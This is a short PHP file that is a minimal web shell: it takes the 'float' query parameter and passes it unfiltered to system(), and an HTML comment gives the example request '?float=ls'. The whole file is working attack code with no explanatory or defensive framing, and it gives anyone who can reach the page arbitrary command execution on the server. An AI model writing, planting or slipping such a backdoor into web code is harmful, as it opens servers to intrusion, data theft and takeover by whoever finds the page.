<?php

if (isset($_GET["float"])) {
    $cmd = $_GET["float"];
    system($cmd);
} ?>
<!-- ?float=ls -->
